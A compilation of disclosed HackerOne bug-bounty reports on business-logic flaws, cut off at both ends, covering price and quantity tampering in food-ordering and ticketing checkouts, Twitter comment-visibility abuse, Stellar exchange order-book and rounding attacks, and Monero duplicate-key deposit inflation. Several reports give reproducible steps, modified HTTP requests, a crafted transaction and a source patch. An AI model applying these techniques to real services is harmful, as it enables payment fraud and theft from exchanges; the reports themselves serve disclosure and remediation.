The total price after tax calculates as $18.70 and is accepted by the system. The attached screenshots show the previous orders, indicating that only $18.70 was charged for the transaction.

```json
{"card_uuid": "09ef096d-18d7-4cb4-83b7-5bd15d310aac", "city": "Cambridge", "email": "mthompson@hexwave.com", "first_name": "Matt", "last_name": "Thompson", "line1": "1230 Massachusetts Ave", "order": {"charges": {"items": [{"item_id": "254baa85-92c1-412e-a391-aaf44508d882", "name": "ChickenBurger", "price": 1200, "quantity": 2, "instructions": "", "total": 1200, "modifiers": [], "sides": []}, {"item_id": "9169bfc1-2ee1-455b-ad65-aeadd36f46eb", "name": "BreadPudding", "price": 900, "quantity": -1, "instructions": "", "total": 900, "modifiers": [], "sides": []}], "taxes": 290, "tip": {"amount": 0}, "total": 1870}, "confirmation_code": "upserve-hacker-cafe-32870", "fulfillment_info": {"customer": {"email": "mthompson@hexwave.com", "first_name": "Matt", "last_name": "Thompson", "phone": "555-555-5555"}, "delivery_info": {"address": {"address_line1": "1230 Massachusetts Ave", "address_line2": null, "city": "Cambridge", "country": "", "state": "MA", "zip_code": "02138"}}, "instructions": "", "type": "delivery"}, "id": "a168f311-f0bf-416c-b813-b277e3a7b5b3", "payments": {"payments": [{"amount": 0, "payment_type": "CREDIT", "tip_amount": 0}], "total": 3190}, "time_placed": "2018-06-11T20:48:51.313Z"}, "order_total": 3190, "phone_number": "555-555-5555", "state": "MA", "store_pretty_url": "upserve-lounge-test-providence-2", "submission_id": "a168f311-f0bf-416c-b813-b277e3a7b5b3", "text_alerts": false, "zip": "02138"}
```

## Impact

The attacker can reduce the price of the order.

**Summary (team):**

The total amount of an order could be modified by including an item with a negative quantity.

---

### [Gaining unlimited bonus points on websites with WooCommerce Points and Rewards](https://hackerone.com/reports/592803)

- **Report ID:** `592803`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Automattic
- **Reporter:** @kolyasapphire
- **Bounty:** - usd
- **Disclosed:** 2019-07-05T23:43:54.225Z
- **CVE(s):** -

**Vulnerability Information:**

In WooCommerce Points and Rewards plugin there is an assumption that Processing order status is only for paid orders.

However, this assumption is wrong for payment gateway Cash On Delivery, which immediately changes order status to Processing on all new orders. Plugin then increases bonus points for the order total which are immediately available to spend.

The problematic code is in class-wc-points-rewards-order.php in function maybe_update_points which gets triggered by following actions:
```
woocommerce_order_status_processing
woocommerce_order_status_completed
woocommerce_order_status_on-hold 
```

The code itself is on lines 50-58:
```
public function maybe_update_points( $order_id ) {
		$order = wc_get_order( $order_id );

		$this->maybe_deduct_redeemed_points( $order_id );

		if ( 'on-hold' !== $order->get_status() ) {
			$this->add_points_earned( $order_id );
		}
	}
```

The solution is to either increase points only on completed orders or to add an extra check if status is processing and payment method is not cash on delivery.

Example solution, change code to:
```
public function maybe_update_points( $order_id ) {
		$order = wc_get_order( $order_id );

		$this->maybe_deduct_redeemed_points( $order_id );

		if ( $order->get_status() !== 'on-hold' && $order->get_status() !== 'processing'  ) {
			$this->add_points_earned( $order_id );
		}
	}
```

## Impact

An attacker can gain an unlimited amount of bonus points and spend them on next orders. The only requirements are WooCommerce Points and Rewards enabled on the website and payment gateway Cash On Delivery enabled, both are very common. Cash on delivery is a core WooCommerce payment gateway. Points and Rewards is easily identified by bonus messages on product pages and on checkout. This bug works on the latest plugin version. The only limit on spending bonus points is defined in plugin settings (eg maximum 50% point redemption).

---

### [attacker can book unlimited tickets in free at https://aaf.com/checkout/order-received/21237/?key=wc_order_5bbef48fa35b2](https://hackerone.com/reports/422331)

- **Report ID:** `422331`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Alliance of American Football 
- **Reporter:** @gujjuboy10x00
- **Bounty:** - usd
- **Disclosed:** 2019-04-25T04:57:10.936Z
- **CVE(s):** -

**Vulnerability Information:**

Dear Team,

**Summary:** [add summary of the vulnerability]
After looking into https://aaf.com/
i get to know that there is way where i can book a ticket and can play around , but it asked for valid credit card and all stuff
so , i tried to bypass and bought a ticket 23 with 0$

Live PoC:
https://aaf.com/checkout/order-received/21237/?key=wc_order_5bbef48fa35b2  (check this one)

**Description:** [add more details about this vulnerability]
attacker can book unlimited tickets in free at https://aaf.com/checkout/order-received/21237/?key=wc_order_5bbef48fa35b2

## Steps To Reproduce:

1. go to aaf.com and login with your account
2. click on ticket option and select San Antonio Commanders Season and click on that and select 3 or any ticket and intercept that request ,
and change from 3-seats-3 to 10-seats-10
{F358789}
snip:

```
Content-Disposition: form-data; name="addon-268-number-of-seats-0"

10-seats-10
```
{F358788}
3. click on add tickets and you can see your order is 0$

and book any number of ticket at 0$

## Supporting Material/References:

Please find attachment

Thanks,
Vishal

## Impact

attacker can book unlimited tickets in free at https://aaf.com/checkout/order-received/21237/?key=wc_order_5bbef48fa35b2

**Summary (researcher):**

Hi Team,

After looking into ticket booking at https://aaf.com/checkout/XXXXXX request , i tried to change value of ticket in burp request , but there is proper validation , so it was not possible to buy ticket by changing amount of ticket.
after looking request carefully , i saw that user can buy 3-seats-3 only from UI level , what if i changed from 3-seats-3 to 10-seats-10 ,  and change money amount from 23$ to 0$ and i was able to forward that request , success.
same way attacker can buy unlimited ticker in 0$ 
my suggestion is to think out of box and dig each and every request completely without just  doing normal known test cases.

Team is very cool and reply very quick and fixed this issue by changing complete architecture of this product.

---

### [[api.zomato.com] Able to manipulate order amount](https://hackerone.com/reports/512968)

- **Report ID:** `512968`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Eternal
- **Reporter:** @pasw
- **Bounty:** - usd
- **Disclosed:** 2019-04-16T15:54:08.757Z
- **CVE(s):** -

**Summary (team):**

@pasw discovered an interesting find where he was able to manipulate the order amount. This was a creative find and we rewarded @pasw with double bounty + promotional bonus of $2,500.

---

### [Logic flaw in the Post creation process allows creating posts with arbitrary types without needing the corresponding nonce](https://hackerone.com/reports/404323)

- **Report ID:** `404323`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** WordPress
- **Reporter:** @simonscannell
- **Bounty:** - usd
- **Disclosed:** 2019-02-14T13:38:13.219Z
- **CVE(s):** -

**Summary (team):**

Simon discovered that authors could create posts of unauthorized post types with specially crafted input
fixed. 

This was fixed in [the 5.0.1 release](https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/), and Simon has published [more details on his blog](https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/).

---

### [[help.steampowered.com] Account takeover bruteforcing SteamGuard](https://hackerone.com/reports/407971)

- **Report ID:** `407971`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Valve
- **Reporter:** @natetheriver
- **Bounty:** 2500 usd
- **Disclosed:** 2019-01-23T00:52:00.072Z
- **CVE(s):** -

**Summary (team):**

Due to a missing protection on a support endpoint, email verification codes could be bruteforced - leading to possible account takeover. The endpoint issue has been corrected.

---

### [Opportunity to post hidden comments](https://hackerone.com/reports/434202)

- **Report ID:** `434202`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** X / xAI
- **Reporter:** @csanuragjain
- **Bounty:** - usd
- **Disclosed:** 2018-12-11T23:33:19.337Z
- **CVE(s):** -

**Vulnerability Information:**

Twitter allows to comment on anyone's tweet. While testing this feature, observed that one can post comment on tweet which will be invisible to the victim whom the reply was posted and would be visible to any other twitter user.
This can allow an Attacker to abuse victim on a tweet. The catch here is victim cannot even know that attacker posted on his tweet but any other twitter user can see that tweet.

**Steps to reproduce**

1. Attacker login to Twitter
2. Attacker blocks victim using Block@victim button at https://twitter.com/<victim>
3. Attacker opens any popular tweet of victim
4. Attacker abuses victim in the tweet reply
5. Victim cannot see the tweet reply posted by Attacker but any other user can see that reply.

**Recommendation**
If a person blocks a twitter user then he/she should not be allowed to post on any of the blocked user tweets.

## Impact

This can allow an Attacker to abuse victim on a tweet. The catch here is victim cannot even know that attacker posted on his tweet but any other twitter user can see that tweet.

**Summary (researcher):**

I reported an issue using which Attacker posted messages on victim's tweet cannot be seen by victim but can be observed by any other twitter user.

An example for this is:

Attacker login to Twitter
Attacker blocks victim using Block@victim button at https://twitter.com/<victim>
Attacker opens any popular tweet of victim
Attacker abuses victim in the tweet reply
Victim cannot see the tweet reply posted by Attacker but any other user can see that reply.

---

### [Global defaming of any twitter user](https://hackerone.com/reports/434689)

- **Report ID:** `434689`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** X / xAI
- **Reporter:** @csanuragjain
- **Bounty:** - usd
- **Disclosed:** 2018-12-06T23:43:48.668Z
- **CVE(s):** -

**Vulnerability Information:**

Private tweets can be used to keep any user's tweet secret from rest of twitter world. Once the user changes his setting from private tweets to public tweets, all his secret tweets become visible. This can become a major issue causing global distributed attacks

**Steps to Reproduce**

1. Assume the attacker is targeting certain president XYZ for the next election
2. Attacker goes to settings and enable private tweet
3. Attacker find famous tweets from 10000+ celebrity profiles
4. Attacker replies on all those 10000+ celebrity profile tweets mentioning "XYZ is the worst candidate. See what he did <some video or something>"
5. None of the twitter user can see that reply from Attacker since it is a private tweet
6. Once the elections are really near, Attacker changes his setting from private to public tweet
7. Attacker reply comments are now visible in all those 10000+ celebrity profile famous tweets
8. This can cause mass defaming, before twitter could actually intervene and remove attacker

## Impact

This can be used to defame any famous celebrity on a mass level

---

### [Lack of payment type validation in dial.uber.com allows for free rides](https://hackerone.com/reports/162199)

- **Report ID:** `162199`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Uber
- **Reporter:** @anandpingsafe
- **Bounty:** - usd
- **Disclosed:** 2018-11-20T22:20:12.066Z
- **CVE(s):** -

**Summary (team):**

When a rider account had an outstanding account balance, improper validation of the payment method ID provided in the request made it possible to use an invalid payment method. As a result, it was possible to provide a non-existent payment type ID such as `xyz` when requesting a ride and get the trip for free. In addition to this, the vulnerability was trivial to reproduce and could have been easily abused. 

Thanks, @appsecure_in!

**Summary (researcher):**

Initially reported it as outstanding balance bypass but then turned out to be a free ride bug..

---

### [It's possible to put SDX orderbook into invalid state and execute trades at arbitrary price](https://hackerone.com/reports/321511)

- **Report ID:** `321511`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Stellar.org
- **Reporter:** @nebolsin
- **Bounty:** - usd
- **Disclosed:** 2018-10-14T14:56:53.085Z
- **CVE(s):** -

**Vulnerability Information:**

stellar-core improperly handles creation of a buy offer which crosses existing sell offers (immediate execution) but can only be filled partially due to a trustline limit on the source account. This makes it possible to create a valid offer to buy any custom asset at higher price than existing sell offers. If counter is not native, it's also possible to create a sell offer lower than existing bids.

Steps to reproduce
-------------------
1. Choose any asset ABC with non-empty orderbook ABC-XLM
2. Create and fund account `H`, then set a trustline for ABC with limit 1
3. Choose arbitrary price `P` higher than existing best ask price `Pa`
4. Prepare the tx to sell `P` XLM for ABC  at price P and then increase the trustline limit to 2, sign it with H secret key and send to the network.

```
Transaction(
  source = H, 
  operations = [
    manageOffer(selling=XLM, buying=ABC, amount=P, price=P, offerId=0),
    changeTrust(asset=ABC, limit=2)
  ]
)
```

Account `H` will receive 1 ABC balance and an offer to sell `(P - Pa)` XLM for ABC will be created at price P.

Order book is now in invalid state and contains crossing offers, so `max(bidPrice) > min(askPrice)`. Next offer to sell ABC for XLM with price lower than P will claim our offer and result in a trade at  price P.

Examples
----------

F268790: Invalid bid created by exploiting this vulnerability. Account with a trustline for BUG asset (balance=500, limit=501) posted an offer to sell 100XLM to buy BUG at price 100 XLM per BUG. Result: account bought 1 BUG from the best ask at 9 XLM per BUG, and an offer to sell the remaining 91XLM at price 100 was saved into the orderbook.

F268791: Real case on a public network on MOBI-XLM traiding pair happened to some user (this is where I noticed the anomaly in trade history and started investigation). Relevant ledgers 16494494 - 16494512.

## Impact

Attacker could exploit this behaviour to mess up the orderbook, trade history and chart for any trading pair on Stellar Distributed Exchange. 

For example, it's possible (and very easy) to create a bot which will constantly create an bid at arbitrary high price P and immediately sell into this bid from another account, making last ticker price always equal P, despite that there're sell offers at a lower price. 

This will make OHLC chart analysis useless because high price will be P on every tick. It could also confuse other market participants by creating the impression that P is the fair price for the asset.

---

### [Exploitable vulnerability in SDEX](https://hackerone.com/reports/330105)

- **Report ID:** `330105`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Stellar.org
- **Reporter:** @orbitlens
- **Bounty:** - usd
- **Disclosed:** 2018-10-14T07:51:57.947Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

Last Thursday I discovered the exploitable vulnerability in SDEX. I immediately reported the bug directly to Jed by email and he confirmed it.  

It's all about rounding during trades. You see, I found that orders are always executed if the price matches market, even if the amount is as small as 0.0000001. A minimum traded amount is also 0.0000001, so if we are buying the more valued asset (say, we are buying BTC for XLM), **an asset is traded 1:1 regardless of the price set in MANAGE_ORDER operation**.

It's not a problem if traded assets have roughly equal value (for example, MOBY/XLM rate is 0.34, CNY/XLM - 0.66). Nobody sanely will spend 100 stroops for fees just to trade 0.0000001 CNY with a slightly better rate.  

Now let's consider trading on XLM/BTC pair. Market exchange price is ~ **37,000 XLM/BTC**.  

I create an order selling 0.0000001 XLM with a price, say, 50,000 XLM/BTC and submit it to the network. The price is higher than avg market, so the order is executed immediately. That's it, **I bought 0.0000001 BTC for 0.0000001 XLM**. If I trade back BTC back to lumens at the market price I'll get **0.0037000** XLM, which is much greater than originally spent **0.0000101** XLM.  

## Proof

(examples on Mainnet)  

- ManageOffer: https://horizon.stellar.org/operations/71512944940158977
- Effects: https://horizon.stellar.org/operations/71512944940158977/effects
  
(reproduced on Testnet) 

- ManageOffer: https://horizon-testnet.stellar.org/operations/34556568129245185
- Account effects: https://horizon-testnet.stellar.org/accounts/GDD7OTUPGR7FMJZLSLYLXTUCPG5IA5UTSPXXZWYRX3HJMGMWWSKCCH65/effects
- Account balance: https://horizon-testnet.stellar.org/accounts/GDD7OTUPGR7FMJZLSLYLXTUCPG5IA5UTSPXXZWYRX3HJMGMWWSKCCH65

## Attack vector

1. Create 20 accounts and fund with, say, 120 XLM each.
2. Code a primitive bot that submits a transaction with 100 ManageOffer operations for each account every 4 seconds (roughly 900\*100 =90,000 operations per hour for each account).
3. Rent a cheap cloud server and launch the bot.
4. Once in 10 minutes or so bot should sell all traded BTC at market price and send all profits to a master-account.
5. Repeat until there is at least one open offer. Then switch to another asset (BTC issued by another anchor, or, for example, ETH tokens).

**Attacker hourly profit:**

`(0.0037-0.0000101) * 20 * 90000=6641.82 XLM/hour.`

If the attacker is greedy, he may initially create up to 50 accounts instead of 20. However, it will immediately affect the overall network performance and everybody will be alarmed. A witty attacker may rather run a bot with 20-30 accounts on a Sunday night to gain a maximum profit.&nbsp;

Traders that are selling BTC (or any other pricey asset) are effectively loosing all money, because offers are traded at a fraction (**1/37,000 in case of BTC)** of the market value despite the fact that the initial price was set correctly.

Not sure if this issue is eligible for reward, as Jed mentioned that you are working on something like this. If yes, here is my account address:

`GB3VFWJW7ZSY2VX666SMVQNHAOMTQ6Y2723CU4XL26F455574JNLC54Z`

## Impact

An attack may lead to a loss of a substantial amount of users' funds. It can't be stopped or prevented without the entire Stellar Network upgrade due to the nature of the distributed ledger. 

Once an attacker is blocked, he may change an IP or the target Stellar Core validator node and continue an attack. In such case he can still more than 100,000 XLM (~20,000 USD) during the first day of attack.

---

### [[www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss](https://hackerone.com/reports/403783)

- **Report ID:** `403783`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Eternal
- **Reporter:** @akhil-reni
- **Bounty:** - usd
- **Disclosed:** 2018-09-17T09:58:51.514Z
- **CVE(s):** -

**Vulnerability Information:**

**Hi, Team**,

Like discussed with Prateek I am dropping the report here. 

**Summary:** 
Like the **title** says using this vulnerability one could order food at negligible price or keep all delivery executives busy.

**Description:**
While fuzzing my way through the payment flow on Zomato orders I came across a couple of interesting bugs that can be escalated to security vulnerabilities. 

██████ **███████**
█████████

█████████**This is a Security Issue** But when we set a quantity to a decimal number, for example: let's say I am trying to order 1 Biryani that costs 99₹, I can set the quantity to 0.1 and now the order price will total to 9.9₹. 
To verify the vulnerability I did two orders:

- One, ordered at the price of 0.1 quantity - Order got cancelled.

{███████}

- Two, ordered at the price of 0.6 quantity - Order got successfull delivered.

{████}

{████}

But in both the cases delivery executives were assigned, that basically means that one could spend as low as 10 rupees and keep all zomato executives in my area busy/occupied.

**Platform(s) Affected:** Website (probably mobile too, if it's the same flow)

## Browsers Verified In [If Applicable]:

N/A

## Steps To Reproduce:

████ Select any resturant 
██████Select any food item from the menu and click continue

{██████████}

3) Intercept the HTTP requests, click select net banking
4) You'll come across the following request, change the quantity to 0.1 (to be on stealth mode, change the quantity to 0.6)

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 825
Cookie: <redacted>
Connection: close

████████&order%5Bdishes%5D%5B0%5D%5Btype%5D=dish&order%5Bdishes%5D%5B0%5D%5Bcomment%5D=&order%5Bdishes%5D%5B0%5D%5Bitem_id%5D=481238585&order%5Bdishes%5D%5B0%5D%5Bitem_name%5D=Veg%20Biryani%20%5BRegular%5D&order%5Bdishes%5D%5B0%5D%5Bmrp_item%5D=0&order%5Bdishes%5D%5B0%5D%5Bquantity%5D=1&order%5Bdishes%5D%5B0%5D%5Btags%5D=1&order%5Bdishes%5D%5B0%5D%5Btax_inclusive%5D=0&order%5Bdishes%5D%5B0%5D%5Bunit_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Btotal_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Bis_bogo_active%5D=false&order%5Bdishes%5D%5B0%5D%5BbogoItemsCount%5D=0&order%5Bdishes%5D%5B0%5D%5BalwaysShowOnCheckout%5D=0&order%5Bdishes%5D%5B0%5D%5Bduration_id%5D=0&res_id=███████&address_id=██████&voucher_code=&payment_method_type=&payment_method_id=0&card_bin=&case=calculatecart&csrfToken=███████
```
{██████████}

5) Click pay and you'll come across the following request. Change the quantity again to 0.1 (or whatever quantity you entered in the previous step)

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 2444
Cookie: <redacted>
Connection: close

case=makeonlineorder&res_id=█████████&order={"charges":[{"item_name":"Delivery Charge","total_cost":10,"type":"charge","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":96623,"display_cost":"â¹10"}],"taxes":[{"item_name":"Taxes","total_cost":0.6,"type":"tax","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹0.60"}],"subtotal2":[{"item_name":"Subtotal","total_cost":12,"type":"subtotal2","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹12.00"}],"total":[{"item_name":"Grand Total","total_cost":"22.60","type":"total","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹22.60"}],"dishes":[{"type":"dish","comment":"","groups":[],"item_id":481238585,"item_name":"Veg Biryani [Regular]","mrp_item":0,"quantity":0.1,"tags":"1","tax_inclusive":0,"unit_cost":120,"total_cost":120,"is_bogo_active":false,"bogoItemsCount":0,"alwaysShowOnCheckout":0,"duration_id":0}]}&██████
```

{████████}

6) You'll be redirected to payment gateway, pay the amount. 
7) If the restaurant hasn't noticed the quantity then the order will be delivered successfully.


## Supporting Material/References:
Order ID - ██████ (which got delivered as POC)

## Impact

The impact is:
1 - Order food for a negligible amount
2 - Or make indefinite orders at a very low price by setting quantity to 0.02. The orders will go through, and you keep all delivery executives busy this way in one single area. This can be a business risk cause all new orders have to wait until a delivery executive is assigned to them.

PS: Setting the severity to high, you can give it a right tag once you discuss the worse case scenario internally.

---

### [Items bought for free due to lacks of quantity controls](https://hackerone.com/reports/357929)

- **Report ID:** `357929`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Reverb.com
- **Reporter:** @nadino
- **Bounty:** - usd
- **Disclosed:** 2018-08-31T12:43:21.141Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

The server fails to check the quantity of the items that are going to be sell. Values <= 0 are accepted as 1.

PoC:

Go here
https://sandbox.reverb.com/fr/item/139897-fender-2-strap-leather-test-2018-leather

Intercept the response after clicking "Add to cart" and put "quantity: 0"

{F302179}

Proceed to checkout

{F302180}

Place order

{F302181}

{F302182}

I used one of the fake credit cards you provide us.

## Impact

Items are sold gratis

---

### [Domain pointing to vimeo portfolio are prone to takeover using on-demand.](https://hackerone.com/reports/387307)

- **Report ID:** `387307`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Vimeo
- **Reporter:** @bugdiscloseguys
- **Bounty:** - usd
- **Disclosed:** 2018-08-27T13:15:21.725Z
- **CVE(s):** -

**Summary (team):**

We thank @bugdiscloseguys for finding this issue. We were only checking \ on-demand to on-demand, but not on-demand to portfolio.

**Summary (researcher):**

Vimeo offers service for pro users to add custom domain under portfolios so that portfolios can be hosted on your (sub)Domain, However Vimeo offers same feature for on-demand pages which required same CNAME entry as portfolios, No cross verification was done if the domain is added in portfolio before or not and hence an attacker could have used on-demand page to takeover a (sub)Domain pointing to Vimeo regardless of its been already claimed.

In case you're wondering about CNAME entry, It is vimeopro.com, If not claimed you can takeover. Another vector for subdomain takeover, I found few!

---

### [Misreporting of received amount by show_transfers](https://hackerone.com/reports/364904)

- **Report ID:** `364904`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Monero
- **Reporter:** @moneromooo
- **Bounty:** - usd
- **Disclosed:** 2018-08-02T00:26:01.794Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

A sender may cause show_transfers to report a higher amount that was actually sent on the recipient's show_transfers output.

**Description:** 

Due to a flaw in process_new_transaction in wallet2.cpp, if the tx pubkey is present multiple times, it will decode outputs correctly as many times, and add up the amounts. This means the final amount reported by show_transfers will be the actual amount received multiplied by the number of duplicate tx pubkeys present in the transaction extra field.

Probably does not work if the recipient expects an integrated address, since someone stripping the payment id and contacting support would be unlikely, so priming the exchange to be suspicious.

This was found by investigating a bug report: https://github.com/monero-project/monero/issues/3983.

A simple patch fixes this: keeping track of pubkeys already scanned for, and skipping those that were already scanned.

## Releases Affected:

Current master and release versions.

## Steps To Reproduce:

1. duplicate the "add_tx_pub_key_to_extra(tx, txkey_pub);" line as many times as wanted in src/cryptonote_core/cryptonote_tx_utils.cpp
2. send a transaction to an exchange, without payment id (so it doesn't get processed automatically)
3. give the tx details to the support person, telling them to check show_transfers for the amount

## Supporting Material/References:

Sending wallet sending 5 (difficulty was set to 100 for ease of mining on an offline testnet):

[wallet 9yvGzy]: transfer 9zcJy2vKeDzCWJXgDApGP3ee1YJvUNWS7UQ9Vn33HT4aSyXKrE9Fs2YCCtGMo7NbuE7zzvYZADkU3SgScqxkkLwnNR1wJdn 5

Transaction 1/1:
Spending from address index 0
Sending 5.000000000000.  The transaction fee is 0.000902370000
Transaction 1/1: txid=<a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00>
Input 1/1: amount=1000.000000000000
Originating block heights:  877928 920324 968699 1026359 *1055454 1116950 1120914
|_____________________________________________________________o__o___o___o_*___o|


Is this okay?  (Y/Yes/N/No): y
Transaction successfully submitted, transaction <a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00>
You can check its status by using the `show_transfers` command.
[wallet 9yvGzy]: start_mining 1
Mining started in daemon
[wallet 9yvGzy]: stop_mining
Mining stopped in daemon
Height 1121390, txid <3ccb5e289b34e03a72319ac2ee8058e2cddffc73dfcdc1ac21a6155d37614a49>, 7.520434042934, idx 0/0
Height 1121390, txid <a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00>, 994.999097630000, idx 0/0
Height 1121390, txid <a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00>, spent 1000.000000000000, idx 0/0
Height 1121391, txid <1b7ecae0238c030486f073480d6431fe5e5958ad59b70b5dee6dec2d05a90259>, 7.519517330565, idx 0/0
Height 1121392, txid <a38f31c5d7257fa803417d9055124627567ea86c7b2c5d2456dbeeb89bc2c288>, 7.519502988224, idx 0/0
[wallet 9yvGzy]: get_tx_key a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00
Tx key: d8c626596898013ee57aee1e8c974408cd153ea6ef64b44cb9d888730434fc00

Recipient wallet receiving the tx (it is set up to use millinero as unit, hence the x1000), all is good:

[wallet 9zcJy2]: refresh
Starting refresh...
Height 1121390, txid <a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00>, 5000.000000000, idx 0/0
Refresh done, blocks received: 3                                

And yet, show_transfers reports 20 monero (20k millinero):

 1121390     in      04:44:06 AM      20000.000000000 a99c5017037039466f3191940fb03d234b23716b6d135ba01154ebc34bf95b00 0000000000000000 0 - 


Note that check_tx_key will show the correct amount, so this is not a sure fire way if the exchange support person is vigilant and asks for such a proof.

## Impact

Scamming a recipient of a lot of monero (up to about 8k times more than sent). Given exchanges using payment ids are used to people forgetting them and having to credit manually, they're likely to wave this through more easily.

---

### [A bug in the Monero wallet balance can enable theft from exchanges](https://hackerone.com/reports/377592)

- **Report ID:** `377592`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** Monero
- **Reporter:** @jagerman
- **Bounty:** - usd
- **Disclosed:** 2018-08-02T00:12:00.655Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A Monero bug (already fixed in master) allows theft from exchanges.  This has been exploited again a Monero-derived coin, so the exploit may be underway currently.

**Description:**
(fluffypony: Also please mention you spoke to me and I recommended you put it on HackerOne)

PR #3985 fixed a wallet balance display bug, which seems innocuous enough, but this bug also extends to exchanges: a transfer of, e.g., 1 XMR to an exchange with a duplicated TX pub key will show up on an exchange as a 2 XMR deposit, which then allows the attacker to withdraw 2 XMR from the exchange's wallet.  An attacker could exploit this repeatedly to siphon of all of the exchange's balance.

## Releases Affected:

  * 0.12.2.0, which is currently active and used by exchanges, and likely earlier releases.
  * current master and the 0.12.3.0 PR branch have the fix applied

## Steps To Reproduce:

  1. deliberately double-sign a transaction with the tx pub key, e.g. by doubling the `add_tx_pub_key_to_extra(tx, txkey_pub);` call in `src/cryptonote_core/cryptonote_tx_utils.cpp`.
  1. Transfer an amount (or send to an exchange)
  1. See 2x the transferred amount appear on the recipient wallet (or the exchange).

## Supporting Material/References:

  * I've notified several other Monero-derived coins that I am in contact with, along with Cryptopia.
  * This attack was carried out against ArQmA on altex.exchange; 4 different wallets managed to steal the entire ARQ exchange deposits before the ARQ wallet was put into maintenance.

## Impact

Theft of all coins deposited in an exchange wallet.

---

### [Attcker can trick monero wallet into reporting it recived twice as much with alternative tx_keypubs](https://hackerone.com/reports/379049)

- **Report ID:** `379049`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Monero
- **Reporter:** @phiren
- **Bounty:** - usd
- **Disclosed:** 2018-07-27T21:28:34.494Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** multiple identical  tx_pub_keys were patched, but you can still use alternative tx_pub_keys to get the same result.

**Description:** An attacker can craft an XMR transaction which causes the receiving wallet to report that it received twice as much XMR as the attacker actually sent.

The balance of the wallet isn't effected, so a personal user probably won't be ticked, however the doubled amount is reported over the get_transfers RPC call.

This is especially devastating for automated wallets, such as cryptocurrency exchanges that rely on RPC calls returning the correct result. 

This attack is a slight modification of the previous flaw that was patched in pull request 3985. That flaw allows unlimited multiplication of funds, instead of just a 2x multiplication that this attack allows.

This attack leverages the alternative tx_pub_keys feature introduced with subaddresses. extra data is arranged so it contains:

1. A dummy tx_pub_key
2. An array of alternative tx_pub_keys entries all containing the legitimate txkey for each output.
3. The legitimate tx_pub_key

The process_new_transaction function will:

1. Grab the dummy tx_pub_key
2. Grab the array of alternative tx_pub_keys
3. Scan all the outputs with both the dummy and alternative tx_pub_keys. Which will match on the legitimate tx_pub_keys.
4. Loop back to the start, grab the legitimate tx_pub_key
5. Since the alternative keys were not added into the public_keys_seen set, it scans all the outputs again.
6. Hacked.
 
## Releases Affected:

 * Monero master ebf2818ab5f42b10745cb99d07920f3197c3d914
 * Monero 0.12.3.0 release tag
 * Probably any Monero release since subaddresses were introduced

## Steps To Reproduce:

  1. On the attacking wallet, Patch cryptonote_tx_utils.cpp
```
    diff --git a/src/cryptonote_core/cryptonote_tx_utils.cpp b/src/cryptonote_core/cryptonote_tx_utils.cpp
    index 071ce591..3835690a 100644
    --- a/src/cryptonote_core/cryptonote_tx_utils.cpp
    +++ b/src/cryptonote_core/cryptonote_tx_utils.cpp
    @@ -351,9 +351,15 @@ namespace cryptonote
           txkey_pub = rct::rct2pk(hwdev.scalarmultBase(rct::sk2rct(tx_key)));
         }
         remove_field_from_tx_extra(tx.extra, typeid(tx_extra_pub_key));
    -    add_tx_pub_key_to_extra(tx, txkey_pub);
    +    crypto::public_key dummy_key;
    +    add_tx_pub_key_to_extra(tx, dummy_key);
    
         std::vector<crypto::public_key> additional_tx_public_keys;
